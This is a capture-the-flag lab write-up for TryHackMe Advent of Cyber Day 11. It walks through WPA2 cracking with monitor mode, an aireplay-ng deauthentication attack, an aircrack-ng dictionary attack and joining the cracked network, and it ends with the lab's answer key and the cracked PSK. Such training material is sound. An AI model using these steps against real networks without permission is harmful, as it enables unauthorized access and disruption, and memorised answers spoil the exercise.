# TryHackMe Advent of Cyber - Day 11: If you'd like to WPA, press the star key!

The challenge revolves around Wi-Fi security, particularly the WPA/WPA2 cracking process. The narrative follows Glitch, the protagonist, as they prepare to thwart Mayor Malware's malicious attempts by demonstrating a practical Wi-Fi attack.

## Key Learning Objectives
1. **Understanding Wi-Fi**:
   - Basics of Wi-Fi technology and its importance.
   - Concepts of SSID, pre-shared key (PSK), and device connectivity.

2. **Exploring Wi-Fi’s Role in Organizations**:
   - How Wi-Fi facilitates business operations.
   - Risks posed by broadcasting SSIDs and potential attacks.

3. **Wi-Fi Attacks**:
   - Evil twin attack.
   - Rogue access point.
   - WPS attack.
   - WPA/WPA2 cracking.

4. **Executing WPA/WPA2 Cracking**:
   - Capturing the 4-way handshake.
   - Understanding vulnerabilities.
   - Using tools to crack the Wi-Fi password.

---

## WPA/WPA2 Cracking Process

To show any wireless devices and their configuration that we have available for us to use, we must run:

```
iw dev
```

### Capturing the Handshake
1. **Setting Up Monitor Mode**:
   - Change the wireless adapter to monitor mode to listen to traffic.
   - Command:
    ```
    sudo ip link set dev wlan2 down

    sudo iw dev wlan2 set type monitor

    sudo ip link set dev wlan2 up
    ```
2. **Scanning Networks**:
   - Use `sudo iw dev wlan2 scan` to detect available Wi-Fi networks.
   - Target network: `MalwareM_AP` (SSID) with WPA2 encryption.
3. **Using Airodump-ng**:
   - Start monitoring traffic on the specific channel of the target network.
   - Command: `sudo airodump-ng wlan2`.

### Deauthentication Attack
- Force a connected client to reconnect to capture the handshake:
  - Command: `sudo aireplay-ng -0 1 -a <BSSID> -c <Client MAC> wlan2`.
- Check for handshake capture in the Airodump-ng terminal.

### Cracking the Password
- Use a dictionary attack with Aircrack-ng:
  - Command: `sudo aircrack-ng -a 2 -b <BSSID> -w <wordlist> <handshake file>`.
- Example wordlist: `rockyou.txt`.
- Successful crack reveals the PSK.

---

## Practical Application
1. **Joining the Network**:
   - Configure the cracked PSK to connect to the network.
   - Command sequence:
     ```bash
     wpa_passphrase <SSID> '<PSK>' > config
     sudo wpa_supplicant -B -c config -i wlan2
     ```

2. **Inspecting the Network**:
   - Analyze the network for vulnerabilities or further investigate connected devices.

---

## Key Takeaways
- Wi-Fi networks, even those secured with WPA2, can be vulnerable if weak passwords are used.
- Understanding and practicing Wi-Fi security measures can help protect against real-world attacks.
- Tools like Aircrack-ng, Airodump-ng, and Aireplay-ng demonstrate how attacks work for educational and preventive purposes.

---

## Questions

1. What is the BSSID of our wireless interface?
    >02:00:00:00:02:00
2. What is the SSID and BSSID of the access point? Format: SSID, BSSID
    >MalwareM_AP, 02:00:00:00:00:00
3. What is the BSSID of the wireless interface that is already connected to the access point?
    >02:00:00:00:01:00
4. What is the PSK after performing the WPA cracking attack?
    >fluffy/champ24